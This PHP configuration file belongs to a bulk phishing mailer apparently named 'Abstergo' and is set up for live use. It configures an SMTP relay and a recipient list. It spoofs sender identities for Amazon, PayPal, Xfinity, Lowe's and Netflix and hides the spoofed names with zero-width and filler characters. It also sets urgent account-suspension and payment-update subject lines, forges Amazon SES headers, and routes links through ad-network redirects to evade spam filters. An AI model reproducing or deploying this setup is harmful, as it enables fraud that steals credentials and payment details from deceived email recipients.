<?php

// == LICENSE CONFIG ==
$abstergo_license 		= 'ABSTERCROT-MONCROT-MMPPSSSHHHHHHH';

// == MAILER CONFIG ==
$mailer = [
	'Randomtimezone'	=> false, // Randomize Mailer Timezone
	'Timezone'			=> 'America/Los_Angeles', // Default Mailer Timezone
	'Mailerselect'		=> 'SwiftMailer',	// MAILER ( SwiftMailer, AbstergoMailer, Mailchimp )
]; 

// == SMTP CONFIG ==
$smtpfiles 	 			= 'smtp.txt';
$smtp_config 			= [
	'Secure'			=> 'tls', // SMTP AUTH SECURE (tls/ssl) ( LEAVE IT BLANK IF NO SSL/TLS )
    'Host'				=> 'smtp-relay.gmail.com', // SMTP HOST
	'Port'				=> '587', // SMTP PORT
	'Hostname'			=> 'mail-oa".rand(1,9)."-f".rand(1,99).".google.com', // CUSTOM HOSTNAME ( DON'T TOUCH IF U DON'T NOW WHAT IS THIS! )
];

// == MAILIST CONFIG ==
$mailist_config = [
	'List'				=> '2.txt', // LIST FILE
	'Clearduplicate'	=> true, // CLEAR DUPLICATE (true/false)
	'Logfailed'			=> true, // LOG YOUR FAILED SEND
];

// == RETURNPATH CONFIG ==
$returnpath_config 		= [
	'Customreturnpath'	=> true, // CUSTOM RETURN PATH (true/false)
	//'Returnpath'	=> '##letternumber_mix_40##-##number_mix_6##-##number_mix_5##@##domain##', // RETURN PATH VALUE
	//'Returnpath'	=> "##smtpuser##", // FROM MAIL
	'Returnpath'	=> 'online.communications=##letternumber_mix_13##=bounces-##number_mix_6##-##number_mix_5##@##domain##', // RETURN PATH VALUE
];

// == ALTERNATIVE CONFIG ==
$alternative_config 	= [
	'Alternative'		=> false, // ALTERNATIVE LETTER PART (true/false)
	'Customalt'			=> false, // CUSTOM ALTERNATIVE LETTER PART (true/false)
	'Altfile'			=> 'Alt.txt', // ALTERNATIVE LETTER PART FILENAME
];

// == IMAGE CONFIG ==
$image_config 			= [
	'Embeddedimage'		=> false, // EMBEDDED LOCAL IMAGE (true/false) ( GOOD FOR COMCAST AND OTHER )
	'Imagefile'			=> 'xxx.png', // EMBEDDED IMAGE FILENAME
	'Encoding'			=> 'base64', // IMAGE ENCODING ( base64, quoted-printable )
	'Imagename'			=> '##letternumber_mix_9##.jpg', // EMBEDDED IMAGE CUSTOM NAME
	'Imagecid'			=> '##letternumber_mix_39##', // EMBEDDED IMAGE CUSTOM CID ( Example use on letter img src="##imagecid##" )
];

// == ATTACHMENT CONFIG ==
$attachment_config 		= [
	'Randomattachment'	=> false, // RANDOM ALL ATTACHMENT SELECTION ON ATTACHMENT FOLDER ( Only For Default Type )
	'Type'				=> 'html', // YOUR ATTACHMENT TYPE (default/html) 
	'Attachmentfile'	=> '', // PDF FILE ( LEAVE IT BLANK IF NOT USE )
	'Encoding'			=> 'base64', // IMAGE ENCODING ( base64, quoted-printable )
	//'Attachmentname' 	=> "=?UTF-8?Q?=F0=9F=93=9E ##emailuser## ##number_mix_1## M##blankquoted8##i##blankquoted7##s##blankquoted1##s##blankquoted6##e##blankquoted8##d##blankquoted10## ##blankquoted2##C##blankquoted8##a##blankquoted1##l##blankquoted4##l##blankquoted3##?=.html", // ATTACHMENT FILE CUSTOM NAME
	'Attachmentname' 	=> "##letternumber_mix_20##.html", // ATTACHMENT FILE CUSTOM NAME
	'Encryptname'		=> "", // ENCRYPT ATTACHMENT NAME ( unicode, unicodebold, unicodeitalic, punnycode ) ( DON'T USE THIS IF YOU USE RANDOM BLANK ON ATTACHMENT NAME!! )
];

// == ENCRYPTION CONFIG ==
$encrypt_config 		= [
	'Charset'			=> 'utf-8', // MAIL CHARSET ( us-ascii, iso-8859-1, utf-8)
	'Encoding'			=> 'base64', // MAIL ENCODING ( 7bit, 8bit, base64, binary, quoted-printable )
	'Encryptletter'		=> '', // CHANGE TEXT ON YOUR LETTER WITH ENCRYPTION ( unicode, unicodebold, unicodeitalic, htmlentities, punnycode )
	'Encryptfromname'	=> '', // ( unicode, unicodebold, unicodeitalic, punnycode ) ( DON'T USE THIS IF YOU USE RANDOM BLANK ON FROMNAME!! )
	'Encryptsubject'	=> '', // ( unicode, unicodebold, unicodeitalic, punnycode ) ( DON'T USE THIS IF YOU USE RANDOM BLANK ON SUBJECT!! )
	'Encryptlink'		=> true, // ENCRYPT LINK USING HTML ENTITIES ENCODING (true/false)
];

// == CUSTOM RANDOM CONFIG ==
$abstergo_custom 		= [
		'##custom1##'	=> 'unicode|unicodebold|unicodeitalic|htmlentities',	
		'##custom2##'	=> '7bit|8bit|base64|binary|quoted-printable',
		'##custom3##'	=> 'netflix|mail.netflix|subcription-netflix',
		'##custom4##'	=> 'value1|value2|value3|value4|value5',
		'##custom5##'	=> 'value1|value2|value3|value4|value5',
];


$abstergo_config 		= [

	// == MAIN CONFIG ==
		'color'				=> true, // CLI COLOR (true/false)
		'Addevent'			=> true, // iCalendar EVENT RANDOM GENERATOR (true/false) ( NOT WORK IF Embeddedimage IS ON!! )
		'Header'			=> true, // CUSTOM HEADER (true/false)
		'Priority'			=> '1', // MAIL PRIORITY ( 1 = High, 3 = Normal, 5 = low )
		'Connection'		=> '1', // CONNECTION FOR SENDING
		'Delay'				=> '1', // SENDING DELAY ( SECOND )
	
	// == DKIM CONFIG ==
		'Customdkim'		=> true, // CUSTOM DKIM (true/false) ( NOT WORK ON GSUITE - USE AN OUTLOOK HEADER FOR GSUITE DKIM CUSTOMIZE )
		'Dkimprivatevalue'	=> 'binary|hexadecimal', // THIS IS DKIM KEY GENERATOR! DON'T TOUCH!!!
	
	// == LETTER CONFIG ==
		'Randomletter'		=> false, // RANDOM ALL LETTER SELECTION ON LETTER FOLDER
		//'Letter'			=> 'pp.txt', // LETTER FILE
		'Letter'			=> 'prme.html', // LETTER FILE
	
	// == LINK CONFIG ==
	//'Link' => 'https://googleads.g.doubleclick.net/pcs/click?xai=AKAOjsvfG-7ngPewlrotzy0L9jgkGeVDIo7OeZz3kOZNLpTjofqspgzkcyCDAO_JxomC_GGys_gMT9iiA1eximZsnGm9CP75sJnJ3WojVKhB7o1VXCHcE9GRJaWV40iJbfvMPNyM1oaxsdxMKubGRKrEgcKqqnixFGlG71btt8NM4V8sFickRvREKIIw0qELAc_zYk-91XCqP3rShcKz9rEyirghOgkK3RZ1rJSNwNhrpOOc9PDgX3K4XEl1lDTmNboZxfWVexcU_9-faVqKM62gYoTRkV8Dg065scjFXQIaD-McSohqr6NG8D68jxGl4O0DtP0zMpDn6LQRFwBYfWRgC5HdP-h9y72PTwpHzRYilIngJKka4l7kOnC5n4s89OOMhEWbZ7GlitL3MvtCDf92Y0mk1PuhjIlOqwBP&sai=AMfl-YS17WS1tsmufrMuzWrssk0Fm1aOY4Ovw3sOv2XCTQHRfzftY10i58pdp8aQaF0UNV57umFXAOIViRV93vP6_3wJw5VOmZoERgitf2IfRNb3xaY&sig=Cg0ArKJSzEFGB1vdX2he&fbs_aeid=[gw_fbsaeid]&adurl=http://t.co/ABuV8Bkx7Z',
	//'Link'	=> 'https://adservice.google.com/ddm/clk/424929466;226923624;r;gclid=;?//t.co/ABuV8Bkx7Z',
	'Link'	=> "https://ib.adnxs.com/getuid?https://t.co/ABuV8Bkx7Z",
	//'Link'	=> 'https://sistematiendita.com', // YOUR LINK ( Example use on letter href="##link##" )
	//'Link'	=> 'https://s.pangkalpinangkota.go.id/DPtjV', // YOUR LINK ( Example use on letter href="##link##" )
	'Randomparameter'	=> true,	// GENERATE RANDOM PARAMETER FOR YOUR LINK (true/false)
	
	];

// == SEND CONFIG ==
$abstergo_send 			= [[

// == BCC ==
	'Bccmode'			=> true, // BCC MODE (true/false)
	'To' 				=> '', // TO ( FOR BCC USE )
	//'To' 				=> 'alert@intl.paypal.com', // TO ( FOR BCC USE )
	//'To' 				=> 'verify@verify-comcast.net', // TO ( FOR BCC USE )

// == REPLY TO ==
	'Replyto'			=> false,
	'Replytomail'		=> 'A##blankbase3##ma##blankbase5##z##blankbase7##on##blankbase9##x@datalushq.com',
	'Replytoname'		=> 'A##blankbase3##ma##blankbase5##z##blankbase7##on##blankbase9##x',

// == MAIN ==
//						=== FROM NAME ===
	'Fromname'	=> "##blankquote3##‌##blankquote3##no‌##blankquote3##-##blankquote5##reply##blankquote8##@##blankquote8##a##blankquote7##ma##blankquote6##z##blankquote5##on##blankquote9##.##blankquote9##com", // no-reply@amazon.com
	//'Fromname'	=> '=?UTF-8?B?Qc2Pbc2PYc2Pes2Pb82Pbs2PIFDNj3LNj2nNj23Nj2XNjw==?=', // AMAZON
	//'Fromname'	=> '=?UTF-8?B?Qc2Pbc2PYc2Pes2Pb82Pbs2PLmPNj2/Njw==?=m', // Amazon.com
	//'Fromname'	=> '##blankquote9##s͏ervice##blankquote6##@intI.##blankquote4##pa##blankquote7##y##blankquote9##p͏##blankquote2##a##blankquote9##|.##blankquote3##c##blankquote1##om', // paypal
	//'Fromname'	=> '##blankquote7##Х‮##blankquote4##y##blankquote9##t##blankquote5##i‮n‮##blankquote6##i##blankquote8##‮f͏##blankquote2##', // XFINITY
	//'Fromname'	=> '=?UTF-8?B?WM2PZs2Pac2P?=##blankquote6##ni##blankquote1##ty', // XFINITY
	//'Fromname'	=> '##blankquote3##A##blankquote5##m##blankquote4##a##blankquote5##z##blankquote7##on', // Customer Service
	//'Fromname'	=> '##blankquote3##Cust##blankquote5##omer ##blankquote4##Ser##blankquote5##vi##blankquote7##ce', // Customer Service
	//'Fromname'	=> '##blankquote3##n##blankquote5##o##blankquote4##-##blankquote5##re##blankquote7##ply', // Customer Service
	//'Fromname'	=> '##blankquote3##no##blankquote5##-##blankquote4##reply##blankquote5##@##blankquote7##amazon.com', // Customer Service
	//'Fromname'	=> 'Customer Service', // Customer Service
	//'Fromname'	=> '=?UTF-8?B?Qc2Pbc2PYXpvzY9uzY8gUM2Pcs2Pac2Pbc2PZc2P?=', // Amazon Prime
	//'Fromname'	=> '##blankquote3##Pr##blankquote5##i##blankquote4##me ##blankquote5##St##blankquote7##ore', // Prime Store
	//'Fromname'	=> '##blankquote3##Pr##blankquote5##i##blankquote4##me ##blankquote5##ID - ##number_mix_8##', // Prime
	//'Fromname'	=> "##blankquote3##‌##blankquote3##as‌##blankquote3##sis##blankquote5##tan##blankquote8##ce-##blankquote8##mes##blankquote7##sa##blankquote6##ge##blankquote5##@##blankquote9##pr##blankquote9##ime##blankquote8##.##blankquote7##c##blankquote6##om", // assistance-message@prime.com
	//'Fromname'	=> "##blankquote3##‌##blankquote3##n‌##blankquote3##o##blankquote5##-##blankquote8##r##blankquote8##e##blankquote7##p##blankquote6##l##blankquote5##y", // no-reply

// 						=== FROM MAIL ===	
	'Frommail'	=> "##blankquote8##do##blankquote9##-##blankquote5##not##blankquote7##-##blankquote6##re##blankquote5##ply##blankquote6##@##blankquote8##noti##blankquote8##fica##blankquote9##tions##blankquote5##.##blankquote7##low##blankquote6##es.##blankquote5##com", // do-not-reply@notifications.lowes.com
	//'Frommail'	=> "##smtpuser##", // FROM MAIL
	//'Frommail'	=> "no-reply@amazon.com", // FROM MAIL
	//'Frommail'	=> "do-not-reply@notifications.lowes.com",
	//'Frommail'	=> "##blankquote3##‌##blankquote3##no‌##blankquote3##-##blankquote5##reply##blankquote8##@##blankquote8##a##blankquote7##ma##blankquote6##z##blankquote5##o##blankquote9##.##blankquote9##com", // no-reply@amazon.com
	//'Frommail'	=> "##blankquote8##do##blankquote7##-not##blankquote8##-##blankquote5##reply##blankquote8##@##blankquote8##notifications##blankquote7##.##blankquote6##lowes##blankquote5##.##blankquote9####blankquote9##com", // do-not-reply@notifications.lowes.com

// 						=== SUBJECT ===
	'Subject'	=> "##blankquote9##A##blankquote4## ##blankquote9##me##blankquote8##ss##blankquote7##age##blankquote8## ##blankquote6##fr##blankquote5##om##blankquote8## ##blankquote9##A##blankquote4##m##blankquote9##az##blankquote8##on##blankquote7## ##blankquote9##Cus##blankquote6##tom##blankquote5##er##blankquote9## ##blankquote4##Se##blankquote9##rv##blankquote8##ic##blankquote7##e##blankquote6##.", // A messages from Amazon Customer Service
	//'Subject'	=> "##blankquote9##Ac##blankquote4##ti##blankquote9##on##blankquote8## Ne##blankquote7##ed##blankquote6##ed##blankquote5## : ##blankquote9##Sig-In", // SUBJECT	
	//'Subject'	=> "##blankquote9##Urg##blankquote4##ent:##blankquote9## ##blankquote8##Yo##blankquote7##ur##blankquote8## ##blankquote6##Pr##blankquote5##ime##blankquote8## ##blankquote9##bene##blankquote4##fits##blankquote9## ##blankquote8##are##blankquote7## ##blankquote9##tem##blankquote6##por##blankquote5##ari##blankquote9##ly##blankquote4## ##blankquote9##sus##blankquote8##pen##blankquote7##ded##blankquote6##.", // p
	//'Subject'	=> "Your Amazon account status is on hold - Account ID: 49576 - ##date3##", // SUBJECT
	//'Subject'	=> "=?UTF-8?B?U82PdM2PYc2PdM2PZc2Pbc2PZc2Pbs2PdM2PIE7Nj2XNj3fNj3PNjy1hzY9kzY9kzY86IEXNj2PNj2/Nj27Nj2/Nj23Nj2nNj2PNjyBpzY9tzY9wzY9hzY9jzY90zY8gb82PZs2PIHDNj2HNj3nNj23Nj2XNj27Nj3TNjyBzzY90zY9hzY90zY91zY9zzY8gYc2Pds2PYc2Pac2PbM2PYc2PYs2PbM2PZc2PIGHNj27Nj2TNjyB5zY9vzY91zY9yzY8gdM2PYc2PeM2PIHLNj2XNj3TNj3XNj3LNj27NjyBwzY9hzY95zY9tzY9lzY9uzY90zY8gcs2PZc2PY82Pb82Pcs2PZM2P?= - Confirm your tax status on ##date## -  TAX-##number_mix_7##", // SUBJECT
	//'Subject'	=> "Invoice Payment Transaction : Renewal Prime Membership was canceled - Your payment to our merchant scheduled renew on ##date## -  AHA##number_mix_7##", // SUBJECT
	//'Subject'	=> "[lnvoice Transaction] Your Membership has ended, P‌‌‌lea‌‌‌se update your paym‌‌‌‌‌‌‌‌ent informa‌‌‌‌‌‌tion. (Ref:##number_mix_7##)", // SUBJECT
	//'Subject'	=> "‌‌‌Update R͏‌‌‌e͏q͏u͏i͏‌‌‌r͏e͏‌‌‌d͏‌‌‌: P‌‌‌lea‌‌‌se e͏x͏t͏e͏n͏d͏ y͏o͏u͏r͏ ##blankquote8##s͏u͏b͏c͏r͏i͏##blankquote3##p͏t͏i͏o͏n͏ b͏e͏f͏o͏r͏e͏ 12, D͏e͏c͏e͏m͏b͏e͏r͏ 2022 (Ref:##number_mix_7##)", // SUBJECT
	//'Subject'	=> "##blankquote1##Paym‌‌‌‌‌‌‌‌ent‌‌‌ ##blankquote4##ɴ̴e‌‌‌tfI‌‌‌ix ##blankquote3##update: ##blankquote4##P‌‌‌lea‌‌‌se ##blankquote6##update ##blankquote9##your paym‌‌‌‌‌‌‌‌ent informa‌‌‌‌‌‌tion. (Ref:##number_mix_7##)",
	//'Subject'	=> "##blankquote9##Alert ##blankquote4##ɴ̴e‌‌‌tfI‌‌‌ix! ##blankquote8##Your account ##blankquote7##needs ##blankquote6##updating ##blankquote5##paym‌‌‌‌‌‌‌‌ent informa‌‌‌‌‌‌tion. (Ref:##number_mix_7##)",
	//'Subject'	=> "Your Amazon account status is on hold - Account ID: 49576 - ##date3##", // SUBJECT
	//'Subject'	=> "‌‌‌N͏o͏t͏i͏c͏‌‌‌e͏: P‌‌‌lea‌‌‌se e͏x͏t͏e͏n͏d͏ y͏o͏u͏r͏ s͏e͏r͏v͏i͏c͏e͏ b͏e͏f͏o͏r͏e͏ 11, D͏e͏c͏e͏m͏b͏e͏r͏ 2022. (Ref-ID:##number_mix_7##)", // SUBJECT
	//'Subject'	=> "##blankquote4##M͏e͏‌‌‌s͏‌‌‌s͏a͏‌‌‌g͏‌‌‌e͏ ##blankquote5##A͏‌‌‌l͏e͏‌‌‌r͏‌‌‌t͏‌‌‌: ##blankquote1##P‌‌‌lea‌‌‌se e͏‌‌‌x͏‌‌‌t͏‌‌‌e͏‌‌‌n͏d͏ ##blankquote8##y͏o͏u͏r͏  ##blankquote9##s͏e͏r͏v͏i͏c͏e͏ b͏e͏f͏o͏r͏e͏ ##date3##".", // SUBJECT
	//'Subject'	=> "[##blankquote4##N͏o͏t͏i͏c͏‌‌‌e͏ ##blankquote5##A͏‌‌‌l͏e͏‌‌‌r͏‌‌‌t͏‌‌‌] ##blankquote1##R‌enewal‌‌ is re‌‌quired fo‌r ##blankquote8##y͏o͏u͏r͏ s͏e͏r͏v͏i͏c͏e͏ b͏e͏f͏o͏r͏e͏ 13, D͏e͏c͏e͏m͏b͏e͏r͏ 2022. ##blankquote9##(Ref-ID:##number_mix_7##)", // SUBJECT
	//'Subject'	=> "[##blankquote4##Ac‌‌tion ##blankquote5##Requir‌‌e] ##blankquote1##R‌enewal‌‌ is re‌‌quired fo‌r ##blankquote8##y͏o͏u͏r͏ s͏e͏r͏v͏i͏c͏e͏ b͏e͏f͏o͏r͏e͏ ##date3##. ##blankquote9##(Ref-ID:##number_mix_7##)", // SUBJECT
	//'Subject'	=> "##blankquote3##‌##blankquote3##A‌##blankquote3##c‌t‌io‌n ##blankquote5##‌Re‌q‌ui‌r‌e‌##blankquote8##:‌ ##blankquote8##Your account ##blankquote7##ne‌‌‌‌‌‌ed‌‌‌‌‌‌s ##blankquote6##u‌‌‌‌‌‌pd‌‌‌‌‌‌at‌‌‌‌‌‌in‌‌‌‌‌‌g ##blankquote5##paym‌‌‌‌‌‌‌‌ent ##blankquote9##infor‌‌‌‌‌‌ma‌‌‌‌‌‌tio‌‌‌‌‌‌n.", // SUBJECT
	//'Subject'	=> "##blankquote3##‌##blankquote3##S‌##blankquote3##ecurity ##blankquote5##‌Notice‌##blankquote8##:‌ ##blankquote8##Your account ##blankquote7##activity ##blankquote6##has ##blankquote5##been ##blankquote9##reviewed.", // SUBJECT
	//'Subject'	=> "=?UTF-8?B?U82PdM2PYc2PdM2PZc2Pbc2PZc2Pbs2PdM2PIE7Nj2XNj3fNj3PNjy1hzY9kzY9kzY86IEXNj2PNj2/Nj27Nj2/Nj23Nj2nNj2PNjyBpzY9tzY9wzY9hzY9jzY90zY8gb82PZs2PIHDNj2HNj3nNj23Nj2XNj27Nj3TNjyBzzY90zY9hzY90zY91zY9zzY8gYc2Pds2PYc2Pac2PbM2PYc2PYs2PbM2PZc2PIGHNj27Nj2TNjyB5zY9vzY91zY9yzY8gdM2PYc2PeM2PIHLNj2XNj3TNj3XNj3LNj27NjyBwzY9hzY95zY9tzY9lzY9uzY90zY8gcs2PZc2PY82Pb82Pcs2PZM2P?= - Confirm your tax status on ##date## -  TAX-##number_mix_7##"
	//'Subject'	=> "##blankquote3##‌##blankquote3##A‌##blankquote3##c‌t‌io‌n ##blankquote5##‌Re‌q‌ui‌r‌e‌: ##blankquote9##R‌ene##blankquote4##wal‌‌ is re‌‌##blankquote5##quir##blankquote6##ed fo‌r ##blankquote8##y͏o͏u͏r͏ s͏e͏r͏##blankquote8##v͏i͏##blankquote9##c͏e͏ b͏e͏f͏o͏##blankquote5##r͏e͏ 0##blankquote7##9 Janua##blankquote6##ry 2023.", // SUBJECT 
	//'Subject'	=> "##blankquote9##ln‌‌‌t‌‌er‌‌n‌‌‌et ##blankquote6##Pr‌‌о‌bl‌e##blankquote4##ms‌: ##blankquote9##Y͏o͏##blankquote5##ur s͏u͏b͏##blankquote2##scri##blankquote3##ption is having ##blankquote6##pr‌‌o‌bl‌e##blankquote4##ms‌ wi‌t‌h ##blankquote8##p͏‌a͏y͏‌m͏e͏‌n͏͏t͏͏.", // SUBJECT
	//'Subject'	=> "‌##blankquote7##l‌n‌‌t##blankquote4##er‌‌‌ne##blankquote3##‌t B‌‌‌i##blankquote4##l‌l##blankquote6##i‌‌ng an##blankquote7##‌d P##blankquote8##a‌‌‌ym##blankquote9##en‌‌t! ##blankquote9##Y͏o͏##blankquote5##ur s͏u͏‌‌b͏##blankquote2##scri##blankquote3##ption is having ##blankquote6##pr‌‌o‌bl‌e##blankquote4##ms‌ wi‌t‌h ##blankquote8##p͏‌a͏y͏‌m͏e͏‌n͏͏t͏͏‌‌.", // SUBJECT
	//'Subject'	=> "##blankquote9##Se‌‌‌‌rvi‌‌‌‌ce ##blankquote2##ln‌‌f‌‌or##blankquote3##m‌‌a##blankquote7##t‌‌i##blankquote5##o‌‌n: ##blankquote3##We noti##blankquote6##ced that your ##blankquote8##se‌‌‌‌rvi‌‌‌‌ce is being ##blankquote9##disru‌‌‌‌pted on a regular basi‌‌‌‌s. ##blankquote7##Ple##blankquote5##ase fix th##blankquote7##is ##blankquote2##problem to avoi‌‌‌‌‌‌d ##blankquote1##in‌‌‌‌terr‌‌‌‌uption‌‌‌‌s.", // SUBJECT
	//'Subject'	=> "##blankquote3##‌##blankquote3##A‌##blankquote3##c‌t‌io‌n ##blankquote5##‌Re‌q‌ui‌r‌e‌! ##blankquote3##Your payment was unsuc##blankquote1##cessful - ##blankquote8##Your account ##blankquote7##ne‌‌‌‌‌‌ed‌‌‌‌‌‌s ##blankquote6##u‌‌‌‌‌‌pd‌‌‌‌‌‌at‌‌‌‌‌‌in‌‌‌‌‌‌g ##blankquote5##paym‌‌‌‌‌‌‌‌ent ##blankquote9##infor‌‌‌‌‌‌ma‌‌‌‌‌‌tio‌‌‌‌‌‌n.", // SUBJECT


],];

// == CUSTOMABLE VARIABLE ==
$customable = base64_encode('{ "rcpt_to": "##email##", "tenant_id": "spc", "customer_id": "##number_mix_6##", "subaccount_id": "1", "message_id": "##letternumber_mix_20##" }'); // THIS IS MY CUSTOM VARIABLE TO ADD ON SOME CONFIG ( IF YOU NOT USING IT YOU CAN DELETE IT )

// == HEADER CONFIG ==
$abstergo_header = array(
	"X-AMAZON-MAIL-RELAY-TYPE: notification",
	"Bounces-to: 202308090000331112f1557bc74225a0ad7680d8f0p0na-C2XLOTQDKNH13N@bounces.amazon.com",
	"X-AMAZON-METADATA: CA=C2XLOTQDKNH13N-CU=A24Q4JATVGST18",
	"X-Original-MessageID: <urn.rtn.msg.202308090000331112f1557bc74225a0ad7680d8f0p0na@1691539233828.>",
	"Feedback-ID: 1.us-east-1.ZHcGJK6s+x+i9lRHKog4RW3tECwWIf1xzTYCZyUaiec=:AmazonSES",
    "X-SES-Outgoing: 2023.08.09-54.240.13.24",
	"List-ID|##randommd5_1##",
	"List-Unsubscribe: <mailto:bounce-CA.com-list.messages.com##letternumber_mix_10##.##number_mix_3##@##domain##>",
	"List-Unsubscribe-Post|List-Unsubscribe: One-Click",
);

// == DKIM CONFIG ==
$abstergo_dkim =  array(
	//'List-Unsubscribe|List-Help',
	//'Campaign|Newsletter-ID',
); // DON'T TOUCH IF U DON'T NOW WHAT IS THIS!

?>